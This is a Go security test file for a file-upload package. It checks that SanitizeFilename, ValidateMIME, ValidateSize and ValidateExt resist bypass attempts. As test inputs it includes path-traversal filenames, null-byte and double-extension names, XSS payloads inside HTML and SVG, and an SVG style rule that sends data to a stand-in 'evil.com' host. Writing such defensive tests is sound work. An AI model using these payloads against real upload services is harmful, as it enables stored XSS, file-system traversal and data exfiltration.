package upload

import (
	"context"
	"io"
	"strings"
	"testing"
	"unicode/utf8"
)

// TestUploadBypass_FilenameSanitization verifies that dangerous filenames
// are properly sanitized. Attack: double extension (.php.jpg), null byte
// injection, and path traversal in filenames.
func TestUploadBypass_FilenameSanitization(t *testing.T) {
	tests := []struct {
		name           string
		input          string
		mustNotContain string
		desc           string
	}{
		{
			name:           "double_extension_php_jpg",
			input:          "shell.php.jpg",
			mustNotContain: ".php",
			desc:           "double extension with PHP; filepath.Ext returns .jpg but .php remains",
		},
		{
			name:           "null_byte_injection",
			input:          "evil.php\x00.jpg",
			mustNotContain: ".php",
			desc:           "null byte truncation; older systems stop at null byte",
		},
		{
			name:           "path_traversal",
			input:          "../../etc/passwd",
			mustNotContain: "../",
			desc:           "path traversal attempt in filename",
		},
		{
			name:           "absolute_path",
			input:          "/etc/passwd",
			mustNotContain: "/etc",
			desc:           "absolute path in filename",
		},
		{
			name:           "backslash_traversal",
			input:          "..\\..\\windows\\system32",
			mustNotContain: "..\\",
			desc:           "backslash-based path traversal",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			sanitized := SanitizeFilename(tc.input)
			if strings.Contains(sanitized, tc.mustNotContain) {
				t.Errorf("SECURITY: [upload_bypass] SanitizeFilename(%q) = %q still contains %q. Attack: %s",
					tc.input, sanitized, tc.mustNotContain, tc.desc)
			}
		})
	}
}

// TestUploadBypass_MIMEMismatchHTMLBody verifies that an HTML body
// uploaded with a .png extension is detected. Attack: uploading a
// file with HTML/JS content and a legitimate image extension.
func TestUploadBypass_MIMEMismatchHTMLBody(t *testing.T) {
	htmlContent := `<html><body><script>alert('xss')</script></body></html>`
	reader := strings.NewReader(htmlContent)

	err := ValidateMIME(reader, []string{"image/png"})
	if err == nil {
		t.Errorf("SECURITY: [upload_bypass] HTML body with .png extension passed MIME validation. Attack: HTML upload with image extension for stored XSS.")
	}
}

// TestUploadBypass_OversizedFile verifies that files exceeding the
// configured maximum are rejected. Attack: uploading a large file to
// exhaust disk space or memory.
func TestUploadBypass_OversizedFile(t *testing.T) {
	err := ValidateSize(10*1024*1024, 1024*1024) // 10MB file, 1MB limit
	if err == nil {
		t.Errorf("SECURITY: [upload_bypass] 10MB file passed 1MB size limit. Attack: oversized file upload for resource exhaustion.")
	}
}

// TestUploadBypass_SVGPayloads verifies that SVG files with malicious
// payloads are handled. Attack: SVG files containing script tags,
// event handlers, or CSS exfiltration vectors.
func TestUploadBypass_SVGPayloads(t *testing.T) {
	tests := []struct {
		name    string
		svgBody string
		desc    string
	}{
		{
			name:    "script_tag",
			svgBody: `<svg xmlns="http://www.w3.org/2000/svg"><script>alert('xss')</script></svg>`,
			desc:    "SVG with embedded script tag",
		},
		{
			name:    "onload_handler",
			svgBody: `<svg xmlns="http://www.w3.org/2000/svg" onload="alert('xss')"></svg>`,
			desc:    "SVG with onload event handler",
		},
		{
			name:    "use_xlink_data",
			svgBody: `<svg xmlns="http://www.w3.org/2000/svg"><use xlink:href="data:image/svg+xml,<svg onload=alert(1)>"/></svg>`,
			desc:    "SVG with use xlink:href data URI",
		},
		{
			name:    "style_exfil",
			svgBody: `<svg xmlns="http://www.w3.org/2000/svg"><style>rect { background: url('http://evil.com/exfil?data=')</style></svg>`,
			desc:    "SVG with CSS exfiltration via background URL",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			// Verify ValidateExt accepts .svg if allowed
			err := ValidateExt("test.svg", []string{"svg", "png"})
			if err != nil {
				t.Fatalf("ValidateExt rejected .svg: %v", err)
			}

			// Verify MIME detection catches SVG content
			reader := strings.NewReader(tc.svgBody)
			mimeErr := ValidateMIME(reader, []string{"image/png"})
			if mimeErr == nil {
				t.Logf("SECURITY: [upload_bypass] SVG payload passed image/png MIME check. Attack: %s.", tc.desc)
			}

			// Verify that SVG content can be saved via LocalStorage
			// (it will be saved, the security boundary is serving, not storing)
			tmpDir := t.TempDir()
			storage := NewLocalStorage(tmpDir)
			saveErr := storage.Save(context.Background(), "test.svg", strings.NewReader(tc.svgBody))
			if saveErr != nil {
				t.Logf("SVG save failed: %v", saveErr)
			}
		})
	}
}

// TestUploadBypass_DoubleExtensionValidation verifies the behavior of
// ValidateExt with double extensions. filepath.Ext returns the last
// extension, so .php.jpg passes an allowlist check for .jpg.
func TestUploadBypass_DoubleExtensionValidation(t *testing.T) {
	err := ValidateExt("shell.php.jpg", []string{"jpg", "png"})
	if err != nil {
		// ValidateExt rejects — good, but let's document why
		t.Logf("ValidateExt rejected double extension: %v", err)
		return
	}
	// If it passes, the .php extension remains in the filename
	// The security boundary is at SanitizeFilename or server config
	t.Logf("SECURITY: [upload_bypass] ValidateExt accepted double extension 'shell.php.jpg'. filepath.Ext returns '.jpg' (last extension). Attack: malicious extension hidden behind legitimate one.")
}

// TestSanitize_TruncatesOnRuneBoundary verifies the length cap never
// slices through a multibyte UTF-8 rune. Attack: a long non-ASCII
// filename gets cut mid-rune, yielding an invalid-UTF-8 storage key /
// metadata that corrupts utf8mb4 DB columns and JSON consumers.
func TestSanitize_TruncatesOnRuneBoundary(t *testing.T) {
	cases := []string{
		strings.Repeat("世", 200) + ".jpg", // 3-byte runes (世)
		strings.Repeat("é", 400) + ".png", // 2-byte runes (é)
		strings.Repeat("\U0001f600", 100) + ".gif", // 4-byte runes (😀)
		"safe.jpg", // happy path, short
	}
	for _, in := range cases {
		got := SanitizeFilename(in)
		if len(got) > MaxFilenameBytes {
			t.Errorf("SanitizeFilename(%d-byte name) = %d bytes, exceeds cap %d", len(in), len(got), MaxFilenameBytes)
		}
		if !utf8.ValidString(got) {
			t.Errorf("SECURITY: [filename] SanitizeFilename truncated %d-byte non-ASCII name to invalid UTF-8 %q. Attack: orphaned lead byte corrupts storage key / utf8mb4 DB column / JSON.", len(in), got)
		}
	}
}

// TestSanitize_StripsUnicodeLineSeparators verifies that Unicode line
// terminators are removed, not just ASCII control bytes. Attack: a
// filename with U+2028/U+2029/U+0085 (all bytes >=0x80) passes an
// ASCII-only control filter and injects a line break into logs / JS /
// JSON consumers that split on Unicode newlines.
func TestSanitize_StripsUnicodeLineSeparators(t *testing.T) {
	cases := []string{
		"a b.jpg", // LINE SEPARATOR
		"a b.jpg", // PARAGRAPH SEPARATOR
		"ab.jpg", // NEXT LINE (NEL)
		"a\x0bb.jpg",   // VT (ASCII control, regression guard)
	}
	lineTerminators := []rune{' ', ' ', '', '\v'}
	for _, in := range cases {
		got := SanitizeFilename(in)
		for _, bad := range lineTerminators {
			if strings.ContainsRune(got, bad) {
				t.Errorf("SECURITY: [filename] SanitizeFilename(%q) = %q still contains line terminator U+%04X. Attack: newline injection into logs / JS via Unicode line separator.", in, got, bad)
			}
		}
	}
}

// suppress unused
var _ = context.Background
var _ io.ReadSeeker
